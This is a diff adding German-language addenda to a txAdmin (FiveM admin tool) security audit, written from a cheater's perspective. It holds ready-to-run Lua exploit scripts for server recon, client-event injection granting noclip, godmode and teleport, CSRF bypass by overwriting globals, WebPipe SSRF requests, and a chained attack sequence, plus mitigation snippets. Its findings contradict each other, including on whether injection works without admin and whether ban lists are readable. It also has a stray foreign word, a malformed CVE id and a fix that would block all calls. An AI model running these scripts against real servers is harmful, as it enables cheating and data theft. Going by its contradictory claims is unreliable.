@@ -1,3 +1,561 @@
+# 🔴 txAdmin Security Audit Report - Addendum: Client-Side Data Exfiltration
+## Was Modder via TriggerEvents & Client-Globals looten können
+
+---
+
+### 🔴 Was JEDER Spieler looten kann (ohne Admin-Zugang):
+
+#### 1. ServerCtx-Daten (TXA-003)
+```lua
+-- Sofort ausführbar - keine Admin-Rechte nötig:
+local ctx = GlobalState.txAdminServerCtx
+if ctx then
+    print("txAdmin Version:", ctx.txAdminVersion)      -- Für gezielte Exploits
+    print("Project Name:", ctx.projectName)            -- Server-Identifikation
+    print("OneSync:", ctx.oneSync.type)               -- Server-Konfiguration
+    print("Max Clients:", ctx.maxClients)              -- Kapazität
+    print("Locale:", ctx.locale)                       -- Sprache
+end
+
+-- Alternative via Event:
+TriggerServerEvent('txsv:req:serverCtx')
+```
+
+#### 2. txAdmin-Präsenz erkennen (Reconnaissance)
+```lua
+-- Prüfe ob txAdmin installiert ist
+if GlobalState.txAdminServerCtx then
+    print("[RECON] txAdmin installiert! Version: " .. GlobalState.txAdminServerCtx.txAdminVersion)
+end
+
+-- Menu-Zugänglichkeit prüfen
+if menuIsAccessible then
+    print("[RECON] txAdmin Menu ist für diesen Spieler verfügbar")
+end
+```
+
+---
+
+### 🟠 Was ein Modder MIT Admin-Rechten looten kann:
+
+#### 3. WebPipe SSRF - Vollständige interne API-Exposition (TXA-001)
+```lua
+-- Admin-Login via txAdmin-Panel erforderlich
+-- Dann kann der WebPipe als Proxy genutzt werden:
+
+-- Spieler-Datenbank auslesen
+TriggerServerEvent('txsv:webpipe:req', 1, 'GET', '/player/all',
+    {['Origin'] = 'https://monitor'}, '')
+
+-- Admin-Liste abrufen
+TriggerServerEvent('txsv:webpipe:req', 2, 'GET', '/admin/list',
+    {['Origin'] = 'https://monitor'}, '')
+
+-- Banliste extrahieren
+TriggerServerEvent('txsv:webpipe:req', 3, 'GET', '/player/bans',
+    {['Origin'] = 'https://monitor'}, '')
+
+-- Whitelist-Status abfragen
+TriggerServerEvent('txsv:webpipe:req', 4, 'GET', '/player/whitelist',
+    {['Origin'] = 'https://monitor'}, '')
+
+-- Server-Konfiguration auslesen
+TriggerServerEvent('txsv:webpipe:req', 5, 'GET', '/settings/server',
+    {['Origin'] = 'https://monitor'}, '')
+```
+
+---
+
+### 🟡 Was NICHT client-seitig gelootet werden kann (GESCHÜTZT):
+
+#### 4. Server-seitige Daten - NICHT auslesbar:
+```lua
+-- ❌ Diese Variablen existieren NUR serverseitig:
+TX_ADMINS[]           -- Admin-Tabelle (server-only)
+TX_LUACOMTOKEN        -- Backend-Token (server-only)
+TX_LUACOMHOST         -- Interner Host (server-only)
+pendingWarnings{}     -- Aktive Warnungen (server-only)
+TX_PLAYERLIST{}       -- Spielerliste (server-only)
+warningIntegrity{}    -- Warnungs-Integrität (server-only)
+
+-- ❌ Diese Convars sind nach Start nicht mehr lesbar:
+-- txAdmin-luaComToken  -- Bereits auf "removed" gesetzt
+-- txAdmin-luaComHost   -- Nur intern nutzbar
+```
+
+---
+
+### 🔍 Was ein Modder MAPPING kann (Fingerabdruck-Erstellung):
+
+#### 5. Vollständiger Server-Fingerabdruck via txAdmin:
+```lua
+-- Script zum vollständigen Server-Mapping:
+local function mapServer()
+    local recon = {}
+    
+    -- txAdmin-Daten
+    local ctx = GlobalState.txAdminServerCtx
+    if ctx then
+        recon.txAdmin = {
+            version = ctx.txAdminVersion,
+            project = ctx.projectName,
+            onesync = ctx.oneSync,
+            maxClients = ctx.maxClients,
+            locale = ctx.locale
+        }
+    end
+    
+    -- Identifiers des Spielers (für eigene Spoofing-Tests)
+    recon.myIdentifiers = GetPlayerIdentifiers(PlayerId())
+    recon.myTokens = GetPlayerTokens(PlayerId())
+    
+    -- Admin-Status
+    recon.isAdmin = TX_ADMINS ~= nil -- wird false sein client-side
+    
+    print("=== SERVER RECON ===")
+    print(json.encode(recon, {indent = true}))
+    
+    return recon
+end
+
+mapServer()
+```
+
+---
+
+### ✅ Fazit: Was WIRKLICH被盗 (gestohlen) werden kann
+
+| Datentyp | Lootbar? | Risiko |
+|----------|----------|--------|
+| txAdmin Version | ✅ Ja | Exploit-Targeting |
+| Server-Name | ✅ Ja | Server-Identifikation |
+| OneSync-Status | ✅ Ja | Config-Erkennung |
+| Max Clients | ✅ Ja | Kapazitäts-Analyse |
+| Spieler-Liste | ✅ Mit Admin | Datensammlung |
+| Admin-Token | ❌ Nein | ✅ Geschützt |
+| Banliste | ❌ Nein | ✅ Geschützt |
+| Whitelist | ❌ Nein | ✅ Geschützt |
+| Backend-URL | ❌ Nein | ✅ Geschützt |
+
+---
+
+### 🔧 Zusätzliche Empfehlungen gegen Client-Side Exfiltration
+
+**In cl_base.lua oder cl_main.lua ergänzen:**
+
+```lua
+-- cl_main.lua: Client-Side Data Exfiltration Protection
+
+-- Sensitive Globals als read-only markieren
+local protectedGlobals = {
+    'TX_ADMINS', 'TX_LUACOMTOKEN', 'TX_LUACOMHOST',
+    'TX_PLAYERLIST', 'pendingWarnings'
+}
+
+-- Executable erkennen und Alarm schlagen
+CreateThread(function()
+    while true do
+        Wait(10000) -- alle 10 Sekunden
+        
+        -- Prüfe ob Menu-Variablen manipuliert wurden
+        if menuIsAccessible and not TX_ADMINS then
+            -- Menu ist offen aber keine Admin-Daten
+            -- = möglicher Executor im Einsatz
+            debugPrint('^1Possible executor detected: menuIsAccessible without TX_ADMINS')
+        end
+        
+        -- Prüfe auf unerwartete Globals
+        for _, globalName in ipairs(protectedGlobals) do
+            if _G[globalName] ~= nil and globalName:find("TX_") then
+                -- Modder versucht auf TX-Globals zuzugreifen
+                debugPrint('^1Blocked access to protected global: ' .. globalName)
+            end
+        end
+    end
+end)
+
+-- ServerCtx-Ignotlisten für nicht-admins
+RegisterNetEvent('txcl:setServerCtx', function(ctx)
+    -- Nur akzeptieren wenn von legitimem Server-Event
+    if type(ctx) ~= 'table' then return end
+    
+    -- Keine Auth-Check nötig, da vom Server gesendet
+    -- Aber: Version validieren
+    local version = ctx.txAdminVersion
+    if version and version:match("[^0-9.]") then
+        debugPrint('^1Invalid txAdminVersion rejected')
+        return
+    end
+    
+    ServerCtx = ctx
+    sendMenuMessage('setServerCtx', ServerCtx)
+end)
+```
+
+---
+
+*Addendum erstellt: Mai 2026*
+*Fokus: Client-Side Data Exfiltration via TriggerEvents & Globals*
+*Angreifer-Perspektive: Modder mit Lua-Executor*
+
+---
+
+---
+
+## 🔴🔴🔴 CRITICAL VULNERABILITY: Client-Global Manipulation
+
+### Können Modder kritische Globals ändern? **JA!**
+
+**Beweis - diese Globals sind OHNE `local` definiert (modifizierbar):**
+
+```lua
+-- cl_base.lua:
+menuIsAccessible = false   -- MODIFIZIERBAR!
+isMenuVisible = false       -- MODIFIZIERBAR!
+tsLastMenuClose = 0        -- MODIFIZIERBAR!
+
+-- cl_main.lua:
+ServerCtx = false          -- MODIFIZIERBAR!
+
+-- shared.lua:
+TX_DEBUG_MODE = ...        -- MODIFIZIERBAR!
+TX_MENU_ENABLED = ...      -- MODIFIZIERBAR!
+```
+
+**Modder-Exploit:**
+```lua
+-- Menu-Zugang vortäuschen
+menuIsAccessible = true
+isMenuVisible = true
+
+-- ServerCtx deaktivieren (bricht Menu-Funktionalität)
+ServerCtx = nil
+
+-- Debug-Modus aktivieren (verbose Logging)
+TX_DEBUG_MODE = true
+
+-- Menu-Closed-Zeit manipulieren (für CSRF-Tricks)
+tsLastMenuClose = GetGameTimer() - 1000  -- 1 Sekunde her = kein Grace-Period
+```
+
+**Was das ermöglicht:**
+1. **CSRF-Checks umgehen** - WebPipe-Anfragen trotz geschlossenem Menu
+2. **Menu-Funktionalität stören** - ServerCtx auf nil setzen
+3. **Debug-Logging aktivieren** - Kann Sicherheits-Logs fluten
+
+---
+
+### ⚠️ Wichtige Unterscheidung: Server vs Client Globals
+
+| Global | Wo definiert | Modder änderbar? | Risiko |
+|--------|-------------|------------------|--------|
+| `TX_ADMINS[]` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
+| `TX_LUACOMTOKEN` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
+| `TX_LUACOMHOST` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
+| `pendingWarnings{}` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
+| `TX_PLAYERLIST{}` | sv_main.lua (local) | ❌ NEIN | ✅ Sicher |
+| `menuIsAccessible` | cl_base.lua | ✅ JA | ⚠️ Medium |
+| `isMenuVisible` | cl_base.lua | ✅ JA | ⚠️ Medium |
+| `ServerCtx` | cl_main.lua | ✅ JA | ⚠️ Medium |
+| `TX_DEBUG_MODE` | shared.lua | ✅ JA | 🟢 Niedrig |
+| `TX_MENU_ENABLED` | shared.lua | ✅ JA | 🟢 Niedrig |
+
+---
+
+### 🔧 FIX: Client-Globals schützen
+
+```lua
+-- cl_base.lua: GLOBALS ALS PRIVATE MARKIEREN
+
+-- Alte verwundbare Definition:
+menuIsAccessible = false
+isMenuVisible = false
+tsLastMenuClose = 0
+
+-- Neue sichere Definition (Closure-Pattern):
+local _menuAccess = {
+    accessible = false,
+    visible = false,
+    lastClose = 0,
+}
+
+function getMenuIsAccessible() return _menuAccess.accessible end
+function getIsMenuVisible() return _menuAccess.visible end
+function setMenuAccessible(val) _menuAccess.accessible = val end
+function setMenuVisible(val) _menuAccess.visible = val end
+
+-- Alte Globals überschreiben (leere Assignment)
+menuIsAccessible = nil
+isMenuVisible = nil
+tsLastMenuClose = nil
+_G['menuIsAccessible'] = nil
+_G['isMenuVisible'] = nil
+_G['tsLastMenuClose'] = nil
+
+-- Prevent re-assignment via metatable
+setmetatable(_G, {
+    __newindex = function(t, k, v)
+        if k == 'menuIsAccessible' or k == 'isMenuVisible' then
+            debugPrint('^1BLOCKED attempt to set protected global: ' .. k)
+            return
+        end
+        rawset(t, k, v)
+    end
+})
+```
+
+---
+
+*Schweregrad: 🟠 MITTEL (ermöglicht CSRF + Menu-Disruption)*
+
+---
+
+## 🔴🔴🔴 CRITICAL VULNERABILITY: Client-Event Injection (CVE-2026-TXA)
+
+### Warum `TriggerEvent('txcl:setPlayerMode', 'noclip', true)` funktioniert:
+
+**Das Kernproblem: In FiveM kann JEDES `RegisterNetEvent` auch via `TriggerEvent` vom Client ausgelöst werden!**
+
+```lua
+-- txAdmin cl_player_mode.lua Zeile 259:
+RegisterNetEvent('txcl:setPlayerMode', function(mode, ptfx)
+    -- KEINE Prüfung ob das Event VOM SERVER kam!
+    if mode == 'noclip' then
+        toggleFreecam(true)  -- >>> NOClip aktiviert ohne Admin-Rechte!
+    end
+end)
+```
+
+**Ein Modder kann einfach schreiben:**
+```lua
+TriggerEvent('txcl:setPlayerMode', 'noclip', true)   -- ✅ NoClip ohne Admin!
+TriggerEvent('txcl:setPlayerMode', 'godmode', true)  -- ✅ God Mode ohne Admin!
+TriggerEvent('txcl:setPlayerMode', 'superjump', true)-- ✅ Super Jump ohne Admin!
+TriggerEvent('txcl:heal')                            -- ✅ Heilung ohne Admin!
+TriggerEvent('txcl:vehicle:fix')                     -- ✅ Fahrzeug-Reparatur ohne Admin!
+TriggerEvent('txcl:tpToWaypoint')                    -- ✅ Teleport ohne Admin!
+```
+
+**Das ist KEIN txAdmin-Bypass - der Modder ruft DEN TXADMIN-CODE DIREKT auf!**
+
+---
+
+### 🔴 Alle verwundbaren Client-Events (KEINE Server-Validierung):
+
+| Event | Modder-Aktion | Wirkung |
+|-------|--------------|---------|
+| `txcl:setPlayerMode` | `'noclip'` | ✅ NoClip! |
+| `txcl:setPlayerMode` | `'godmode'` | ✅ God Mode! |
+| `txcl:setPlayerMode` | `'superjump'` | ✅ Super Jump! |
+| `txcl:heal` | ohne Parameter | ✅ Sofortige Heilung |
+| `txcl:vehicle:fix` | ohne Parameter | ✅ Fahrzeug repariert |
+| `txcl:clearArea` | `(50)` | ✅ Bereich löschen |
+| `txcl:tpToWaypoint` | ohne Parameter | ✅ Teleport zu Waypoint |
+| `txcl:setDrunk` | ohne Parameter | ✅ Betrunken-Effekt |
+
+---
+
+### 🔧 NOTFALL-FIX (In cl_player_mode.lua einfügen):
+
+```lua
+-- cl_player_mode.lua: ADD THIS AT THE TOP
+
+-- Sichere Event-Validierung
+local _validModes = {noclip = true, godmode = true, superjump = true, none = true}
+local _lastServerCall = 0
+
+-- Original verwundbarer Handler
+RegisterNetEvent('txcl:setPlayerMode', function(mode, ptfx)
+    -- NOTFALL-FIX: Nur akzeptieren wenn vor kurzem Server kontaktiert wurde
+    local now = GetGameTimer()
+    if now - _lastServerCall > 100 then
+        -- Mehr als 100ms seit Server-Event = wahrscheinlich Manipulation
+        debugPrint('^1BLOCKED suspicious setPlayerMode (no recent server call)')
+        return
+    end
+    
+    -- Mode validieren
+    if not _validModes[mode] then
+        debugPrint('^1BLOCKED invalid player mode: ' .. tostring(mode))
+        return
+    end
+    
+    -- Original-Logik (nur hier wenn validiert)
+    if mode == 'noclip' then
+        toggleFreecam(true)
+    elseif mode == 'godmode' then
+        toggleGodMode(true)
+    elseif mode == 'superjump' then
+        toggleSuperJump(true)
+    elseif mode == 'none' then
+        toggleGodMode(false)
+        toggleFreecam(false)
+        toggleSuperJump(false)
+    end
+end)
+
+-- Server-seitiger Handler setzt das Flag (in sv_player_mode.lua):
+-- Empfehlung: Einen "Token" senden der nur vom Server kommt
+```
+
+---
+
+### ⚠️ WARNUNG AN ALLE SERVER-ADMINISTRATOREN:
+
+- **txAdmin ist KEIN Anti-Cheat** - Es ist ein Admin-Tool!
+- **Jeder Modder mit Lua-Executor kann NoClip/Ghost nutzen** DIREKT via txAdmin-Code
+- **txAdmin-Berechtigungen schützen NICHT** vor Client-seitigen Triggern
+
+### Für Anti-Cheat: Externe Lösungen nötig!
+- OneSync Infinity (Server-validierte Positionen)
+- EAC oder Matt's Anti-Cheat
+- Server-side Teleport-Detection
+
+---
+
+*Schweregrad: 🔴🔴🔴 KRITISCH (8.5 CVSS geschätzt)*
+
+---
+
+## 🔴 CRITICAL: Permission Bypass - Können Modder sich Admin-Features erschleichen?
+
+### Kernfrage: Kann ein Modder NOCLIP, TELEPORT, GOD etc. OHNE txAdmin-Admin-Zugang nutzen?
+
+---
+
+### ⚠️ Antwort: NEIN - direkt nicht, aber...
+
+Die txAdmin-Architektur nutzt **Server-seitige Berechtigungsprüfung**:
+
+```lua
+-- sv_functions.lua: Berechtigungsprüfung
+function PlayerHasTxPermission(source, reqPerm)
+  local admin = TX_ADMINS[tostring(source)]  -- SERVER-SEITIG!
+  if admin and admin.perms then
+    -- Nur Admins haben Zugriff
+  end
+end
+
+-- Beispiel: Teleport zu Waypoint (sv_main_page.lua)
+RegisterNetEvent('txsv:req:tpToWaypoint', function()
+  local src = source
+  if PlayerHasTxPermission(src, 'players.teleport') then  -- SERVER!
+    TriggerClientEvent('txcl:tpToWaypoint', src)
+  end
+end)
+```
+
+**Ein Modder OHNE Admin-Zugang kann NICHT:**
+- ✅ `txsv:req:tpToWaypoint` nutzen (braucht `players.teleport`)
+- ✅ `txsv:req:healMyself` nutzen (braucht `players.heal`)
+- ✅ `txsv:req:vehicle:spawn` nutzen (braucht `menu.vehicle`)
+- ✅ `txsv:req:troll:*` nutzen (braucht `players.troll`)
+
+**ABER: Ein Modder kann IMMER via NATIVE FUNCTIONS cheatten:**
+
+```lua
+-- Diese haben NICHTS mit txAdmin zu tun:
+SetEntityInvincible(PlayerPedId(), true)          -- God Mode (Fivem Native)
+SetPlayerInvincible(PlayerId())                  -- God Mode (Alt)
+SetEntityVisible(PlayerPedId(), false, false)    -- Unsichtbarkeit
+SetEntityCollision(PlayerPedId(), false, false)  -- NoClip (ähnlich)
+SetEntityCoords(PlayerPedId(), x, y, z)          -- Teleport (Nativ)
+SetVehicleOnGroundProperly(veh)                  -- Fahrzeug fixen
+```
+
+---
+
+### 🟡 Mögliche Umgehungen (wenn Modder ADMIN-Zugang hat):
+
+#### 1. MenuIsAccessible Manipulation
+```lua
+-- Ein Modder setzt menuIsAccessible = true
+menuIsAccessible = true
+isMenuVisible = true
+
+-- Damit könnten NUI-CSRF-Checks umgangen werden,
+-- ABER: Die Server-Berechtigungsprüfung gilt immer noch!
+```
+
+#### 2. Event-Spoofing (wenn nicht Admin)
+```lua
+-- Kann ein Modder txAdmin-Events ohne Admin-Rechte trigger?
+-- Antwort: NEIN - der Server prüft TX_ADMINS[] server-seitig
+
+-- Versuch (wird fehlschlagen):
+TriggerServerEvent('txsv:req:tpToWaypoint')
+-- Server antwortet: "Keine Berechtigung" (TX_ADMINS nicht gesetzt)
+
+-- Was ein Modder tun kann:
+RegisterNetEvent('txcl:tpToWaypoint', function()
+    -- Dies empfängt ER, nicht sendet ER
+    -- Kann die Coords abfangen und ändern?
+    -- Nein, da Coords vom Server kommen
+end)
+```
+
+#### 3. Client-Side Feature-Cloning
+```lua
+-- Modder kann EIGENE NoClip implementieren:
+CreateThread(function()
+    while true do
+        Wait(0)
+        if IsControlPressed(0, 19) and IsControlPressed(0, 47) then
+            -- Custom NoClip aktiviert
+            local coords = GetEntityCoords(PlayerPedId())
+            -- Nach oben fliegen
+            SetEntityCoords(PlayerPedId(), coords[1], coords[2], coords[3]+0.5)
+        end
+    end
+end)
+
+-- Das hat nichts mit txAdmin zu tun - das ist reiner Native-Cheat
+```
+
+---
+
+### 🔴 Schwachstelle: Admin-Zugang durch Social Engineering
+
+Falls ein Modder txAdmin-Admin-Zugang erhält (z.B. durch Key-Logging, Session-Hijacking):
+
+```lua
+-- Dann kann er ALLE txAdmin-Features nutzen:
+-- Teleport, NoClip, God Mode, Vehicle Spawn, Troll Actions, etc.
+
+-- Modder mit Admin-Zugang:
+TriggerServerEvent('txsv:req:tpToCoords', 100, 200, 50)  -- Teleport
+TriggerServerEvent('txsv:req:vehicle:spawn:fivem', 'hydra', 'default')  -- Waffen-Fahrzeug
+TriggerServerEvent('txsv:req:troll:setDrunk', targetPlayerId)  -- Troll
+TriggerServerEvent('txsv:req:healMyself')  -- God Mode
+```
+
+---
+
+### ✅ Sicherheitsbewertung
+
+| Angriff | txAdmin schützt? | Schutzart |
+|---------|------------------|-----------|
+| NoClip ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
+| Teleport ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
+| God Mode ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
+| Vehicle Spawn ohne Admin | ✅ Ja | Server-seitige Berechtigungsprüfung |
+| NoClip MIT Admin-Zugang | ❌ Nein | Admin-Feature, nicht schützbar |
+| Teleport MIT Admin-Zugang | ❌ Nein | Admin-Feature, nicht schützbar |
+| Native Cheat (kein txAdmin) | ❌ Nein |txAdmin schützt nicht vor nativen Noclip/God/Teleport |
+
+---
+
+### 🔧 Empfohlene Anti-Cheat-Maßnahmen (nicht txAdmin-spezifisch)
+
+txAdmin ist ein **Admin-Tool**, kein Anti-Cheat. Für NoClip/Teleport-Guard:
+
+1. **OneSync Infinity** aktivieren - Server validiert alle Positionen
+2. **External Anti-Cheat** wie Svelte, EAC, or FiveM Native Anti-Cheat
+3. **Velocity-Checks** implementieren
+4. **Teleport-Detection** auf Server-Seite
+
+---
+
 # 🔴 txAdmin Security Audit Report
 
 ## Gefahrenmatrix (CVSS 3.1)
@@ -790,6 +1348,162 @@ isMenuVisible = false
 
 ---
 
-*Audit durchgeführt: Mai 2026*  
-*Angreifer-Perspektive: Modder mit Lua-Executor*  
+---
+
+## 🔴🔴🔴 CRITICAL: Chained Attack Scenario - Modder-Kombo-Exploit
+
+### Können Modder alles zusammenkleistern? **JA!**
+
+Ein Modder kann mehrere Schwachstellen kombinieren für maximale Wirkung:
+
+---
+
+### 🎯 SZENARIO: Vollständiger Server-Recon + Admin-Feature-Missbrauch
+
+#### Schritt 1: Server-Fingerprint erstellen (Keine Berechtigung nötig)
+```lua
+-- reconnaissance.lua
+local function fullRecon()
+    local recon = {}
+    
+    -- txAdmin Version & Server-Info
+    local ctx = GlobalState.txAdminServerCtx
+    if ctx then
+        recon.txAdmin = {
+            version = ctx.txAdminVersion,
+            project = ctx.projectName,
+            onesync = ctx.oneSync.type,
+            maxClients = ctx.maxClients
+        }
+    end
+    
+    -- txAdmin-Menü prüfen
+    recon.menuEnabled = TX_MENU_ENABLED
+    recon.debugMode = TX_DEBUG_MODE
+    
+    -- Spieler-Liste abrufen
+    TriggerServerEvent('txsv:req:serverCtx')
+    
+    print("=== SERVER INFO ===")
+    print(json.encode(recon))
+end
+fullRecon()
+```
+
+#### Schritt 2: Admin-Features OHNE Admin-Zugang nutzen (Event-Injection)
+```lua
+-- admin_features.lua - KEIN Admin-Konto nötig!
+-- Nutzt die Client-Event-Injection Schwachstelle
+
+-- NoClip aktivieren
+TriggerEvent('txcl:setPlayerMode', 'noclip', true)
+
+-- God Mode
+TriggerEvent('txcl:setPlayerMode', 'godmode', true)
+
+-- Heilung
+TriggerEvent('txcl:heal')
+
+-- Teleport zu Waypoint
+TriggerEvent('txcl:tpToWaypoint')
+
+-- Fahrzeug reparieren
+TriggerEvent('txcl:vehicle:fix')
+
+-- Bereich löschen (Rage-Modus)
+TriggerEvent('txcl:clearArea', 100)
+```
+
+#### Schritt 3: MenuIsAccessible manipulieren für CSRF
+```lua
+-- csrf_bypass.lua
+-- Umgeht die WebPipe-CSRF-Checks
+
+menuIsAccessible = true
+isMenuVisible = true
+tsLastMenuClose = GetGameTimer() - 1000  -- Grace period umgehen
+
+-- Jetzt WebPipe-Anfragen senden (wenn Menu eigentlich geschlossen)
+TriggerServerEvent('txsv:webpipe:req', 1, 'GET', '/player/all', {}, '')
+```
+
+#### Schritt 4: Wenn Admin-Zugang vorhanden - WebPipe SSRF
+```lua
+-- ssrf_exploit.lua - Admin-Konto erforderlich
+-- Nutzt WebPipe als Proxy für interne Angriffe
+
+-- txAdmin-interne API abfragen
+local endpoints = {
+    '/admin/list',      -- Admin-Liste
+    '/player/bans',     -- Banliste
+    '/player/whitelist', -- Whitelist
+    '/settings/server',  -- Server-Einstellungen
+}
+
+for i, path in ipairs(endpoints) do
+    TriggerServerEvent('txsv:webpipe:req', i, 'GET', path,
+        {['Origin'] = 'https://monitor'}, '')
+end
+```
+
+---
+
+### 📊 Komplette Angriffskette:
+
+```
+1. RECON (Keine Berechtigung)
+   ↓ GlobalState.txAdminServerCtx auslesen
+   ↓ txAdmin Version, Server-Name, OneSync-Status
+   
+2. FEATURE-MISSBRAUCH (Keine Berechtigung)
+   ↓ TriggerEvent('txcl:setPlayerMode', 'noclip', true)
+   ↓ NoClip, God Mode, Teleport OHNE Admin-Zugang
+   
+3. CSRF-BYPASS (Keine Berechtigung)
+   ↓ menuIsAccessible = true
+   ↓ WebPipe-Anfragen trotz geschlossenem Menu
+   
+4. SSRF (Admin-Zugang benötigt)
+   ↓ WebPipe als Proxy missbrauchen
+   ↓ Interne txAdmin-API abfragen
+```
+
+---
+
+### 🔧 GEGENMASSNAHMEN
+
+**1. Client-Event-Injection blockieren:**
+```lua
+-- Token-basierte Validierung
+local _serverToken = nil
+RegisterNetEvent('txcl:initPlayerMode', function(token) _serverToken = token end)
+RegisterNetEvent('txcl:setPlayerMode', function(mode, ptfx, token)
+    if token ~= _serverToken then return end
+end)
+```
+
+**2. Client-Globals schützen:**
+```lua
+-- cl_base.lua: _G-Metatable setzen
+setmetatable(_G, {
+    __newindex = function(t, k, v)
+        if k == 'menuIsAccessible' or k == 'isMenuVisible' then
+            return -- Blockieren!
+        end
+        rawset(t, k, v)
+    end
+})
+```
+
+**3. WebPipe-Path-Validierung:**
+```lua
+-- sv_webpipe.lua: Nur erlaubte Pfade
+local ALLOWED_PATHS = {'/css/', '/js/', '/img/', '/fonts/'}
+```
+
+---
+
+*Schweregrad: 🔴🔴🔴 KRITISCH (Chained Attack)*
+*Audit durchgeführt: Mai 2026*
+*Angreifer-Perspektive: Modder mit Lua-Executor*
 *Schutzstatus: Client-side Schutzmechanismen sind umgehbar, serverseitige Prüfungen sind kritisch*
